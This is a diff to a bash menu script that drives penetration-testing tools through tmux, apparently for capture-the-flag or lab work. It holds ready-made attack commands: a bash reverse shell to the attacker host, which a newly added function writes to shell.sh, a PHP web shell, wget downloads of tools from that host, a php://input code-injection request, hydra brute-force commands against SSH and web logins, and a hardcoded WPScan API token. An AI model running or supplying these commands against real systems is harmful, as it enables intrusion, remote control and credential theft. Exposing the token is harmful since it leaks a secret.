@@ -26,27 +26,31 @@ EXTS=.asp,.aspx,.bat,.cgi,.htm,.html,.js,.log,.php,.phtml,.sh,.sql,.txt,.xml
 COMMAND_2='Serve this directory'
 COMMAND_3='Serve tools'
 COMMAND_4='Upload handyman'
-COMMAND_5="Add entry to /etc/hosts"
-COMMAND_6="Remove entry from /etc/hosts"
-COMMAND_7="Setup proxychains config"
+COMMAND_5='Generate shell.sh'
+COMMAND_6="Add entry to /etc/hosts"
+COMMAND_7="Remove entry from /etc/hosts"
+COMMAND_8="Setup proxychains config"
 
 COMMAND_e1='rustscan --accessible --ulimit 5000 -a $RHOST -- -Pn -sV -sC | tee -i nmap-scan.txt | highlight "^\d+\/tcp"'
 COMMAND_e2='nmap -Pn -sV -oN nmap-vuln.txt --script vuln $RHOST | highlight "CVE-\d*-\d*"'
 COMMAND_e3='ffuf -v -c -recursion -t 64 -o ffuf.json -e $EXTS -w "$W_COMMON" -u http://$RHOST/FUZZ'
 COMMAND_e4='whatweb -v $RHOST'
 COMMAND_e5='wpscan --api-token G8ifDn8HmQOCnzEB9Z7i9NkJDX9cGvfmPPbOdxTXNFk -v -o wpscan.txt --url http://$RHOST'
+COMMAND_e6='~/Tools/enum4linux.pl -GUSnoi $RHOST | tee -i samba.txt | highlight "^user:\[.*\]|^.*\sMapping: OK"'
+COMMAND_e7='wfuzz -c -z file,$W_COMMON -X POST --hh 45 -u http://$RHOST/?FUZZ\=test'
 
 COMMAND_n1='nc -nlvp 4444'
 COMMAND_n2='ssh -i id_rsa $USER@$RHOST -p 22'
 COMMAND_n3='ssh -i id_rsa $USER@$RHOST -L $RPORT:172.16.0.0:$LPORT -N -f'
 COMMAND_n4='ssh -i id_rsa $USER@$RHOST -D 9050 -N -f'
 COMMAND_n5='chisel server -p 9999 --reverse -v'
+COMMAND_n6='nc -nlvp 5555 | tar xf -'
 
 COMMAND_u1='scp ~/Tools/linpeas.sh $USER@$RHOST:/tmp'
 COMMAND_u2='scp ~/Tools/chisel $USER@$RHOST:/tmp'
 
-COMMAND_b1='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST ssh -s PORT'
-COMMAND_b2='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST -s 80 http-post-form "/login.php:username=^USER^&password=^PASS^&login=Submit:F=Login failed"'
+COMMAND_b1='hydra -f -I -vV -t 16 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST ssh -s PORT'
+COMMAND_b2='hydra -f -I -vV -t 16 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST -s 80 http-post-form "/login.php:username=^USER^&password=^PASS^&login=Submit:F=Login failed"'
 COMMAND_b3='ffuf -v -t 8 -X POST -w $W_COMMON -u http://$RHOST/login.php -d "key=FUZZ"'
 COMMAND_b4='fcrackzip -D -v -p "$W_PASSWORD" file.zip'
 COMMAND_b5='python2 /usr/share/john/ssh2john.py id_rsa > key.hash'
@@ -61,8 +65,10 @@ COMMAND_t1='haiti HASH'
 COMMAND_t2='python ~/Tools/wordlistctl/wordlistctl.py search/list -g GROUP'
 COMMAND_t3='python ~/Tools/wordlistctl/wordlistctl.py fetch -d -b ~/Tools/wordlists -l KEYWORD'
 
-LINK_1="http://$RHOST/robots.txt"
-LINK_2="https://gtfobins.github.io/"
+LINK_1="http://$RHOST"
+LINK_2="http://$RHOST/robots.txt"
+LINK_3="https://gtfobins.github.io/"
+LINK_4="https://gchq.github.io/CyberChef/"
 
 CLIP_1="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
 CLIP_2="export TERM=xterm"
@@ -70,6 +76,7 @@ CLIP_3="stty raw -echo; fg"
 CLIP_4="<?php system($_GET[\"c\"]); ?>"
 CLIP_5="bash -i >& /dev/tcp/$LHOST/4444 0>&1"
 CLIP_6="wget -O /tmp/handyman http://$LHOST:8000/handyman_cp"
+CLIP_6="wget -O /tmp/linpeas.sh http://$LHOST:8000/linpeas.sh"
 CLIP_7="wget -O /tmp/chisel http://$LHOST:8000/chisel"
 CLIP_8="/tmp/chisel client $LHOST:9999 R:$LHOST:8888:127.0.0.1:[OPEN_PORT]"
 CLIP_9="curl -X POST --data \"<?php echo shell_exec('id'); ?>\" \"http://$RHOST/index.php?page=php://input%00\" -k -v"
@@ -91,6 +98,7 @@ show_menus() {
   echo -e "  ${YELLOW}5${NOCOLOR}) $COMMAND_5"
   echo -e "  ${YELLOW}6${NOCOLOR}) $COMMAND_6"
   echo -e "  ${YELLOW}7${NOCOLOR}) $COMMAND_7"
+  echo -e "  ${YELLOW}8${NOCOLOR}) $COMMAND_8"
   echo -e ""
   echo -e "  ${LIGHTGREEN}Enumeration${NOCOLOR}"
   echo -e "  -------------"
@@ -99,6 +107,8 @@ show_menus() {
   echo -e "  ${YELLOW}e3${NOCOLOR}) $COMMAND_e3 (${YELLOW}e33${NOCOLOR} for output)"
   echo -e "  ${YELLOW}e4${NOCOLOR}) $COMMAND_e4"
   echo -e "  ${YELLOW}e5${NOCOLOR}) $COMMAND_e5 (${YELLOW}e55${NOCOLOR} for output)"
+  echo -e "  ${YELLOW}e6${NOCOLOR}) $COMMAND_e6 (${YELLOW}e66${NOCOLOR} for output)"
+  echo -e "  ${YELLOW}e7${NOCOLOR}) $COMMAND_e7"
   echo -e ""
   echo -e "  ${LIGHTGREEN}Network${NOCOLOR}"
   echo -e "  -------"
@@ -107,6 +117,7 @@ show_menus() {
   echo -e "  ${YELLOW}n3${NOCOLOR}) $COMMAND_n3"
   echo -e "  ${YELLOW}n4${NOCOLOR}) $COMMAND_n4"
   echo -e "  ${YELLOW}n5${NOCOLOR}) $COMMAND_n5"
+  echo -e "  ${YELLOW}n6${NOCOLOR}) $COMMAND_n6"
   echo -e ""
   echo -e "  ${LIGHTGREEN}Upload${NOCOLOR}"
   echo -e "  ------"
@@ -139,6 +150,8 @@ show_menus() {
   echo -e "  -----"
   echo -e "  ${YELLOW}l1${NOCOLOR}) $LINK_1"
   echo -e "  ${YELLOW}l2${NOCOLOR}) $LINK_2"
+  echo -e "  ${YELLOW}l3${NOCOLOR}) $LINK_3"
+  echo -e "  ${YELLOW}l4${NOCOLOR}) $LINK_4"
   echo -e ""
   echo -e "  ${LIGHTGREEN}Clipboard${NOCOLOR}"
   echo -e "  ---------"
@@ -239,6 +252,10 @@ runUploadHandyman() {
   tmux send-keys "scp ~/Tools/handyman_cp $USER@$RHOST:/tmp/handyman"
 }
 
+genShell() {
+  echo "bash -i >& /dev/tcp/$LHOST/4444 0>&1" > shell.sh
+}
+
 runV() {
   openSplit
 
@@ -256,6 +273,7 @@ runCat () {
     e2) C="cat nmap-vuln.txt | highlight \"CVE-\d*-\d*\"";;
     e3) C="cat ffuf.json | python -m json.tool";;
     e5) C="cat wpscan.txt | highlight \"CVE-\d*-\d*\"";;
+    e6) C="cat samba.txt | highlight \"^user:\[.*\]|^.*\sMapping: OK\"";;
   esac
 
   tmux send-keys "$C" Enter
@@ -319,9 +337,10 @@ read_options() {
     2) runServeHere;;
     3) runServeTools;;
     4) runUploadHandyman;;
-    5) addEtcHosts;;
-    6) removeEtcHosts;;
-    7) setupProxyChains;;
+    5) genShell;;
+    6) addEtcHosts;;
+    7) removeEtcHosts;;
+    8) setupProxyChains;;
 
     e1) runV $COMMAND_e1;;
     e11) runCat 'e1';;
@@ -332,12 +351,16 @@ read_options() {
     e4) runV $COMMAND_e4;;
     e5) runV $COMMAND_e5;;
     e55) runCat 'e5';;
+    e6) runV $COMMAND_e6;;
+    e66) runCat 'e6';;
+    e7) runV $COMMAND_e7;;
 
     n1) runV $COMMAND_n1;;
     n2) runV $COMMAND_n2;;
     n3) runV $COMMAND_n3;;
     n4) runV $COMMAND_n4;;
     n5) runV $COMMAND_n5;;
+    n6) runV $COMMAND_n6;;
 
     u1) runV $COMMAND_u1;;
     u2) runV $COMMAND_u2;;
@@ -360,6 +383,8 @@ read_options() {
 
     l1) openLink $LINK_1;;
     l2) openLink $LINK_2;;
+    l3) openLink $LINK_3;;
+    l4) openLink $LINK_4;;
 
     c1) runC $CLIP_1;;
     c2) runC $CLIP_2;;
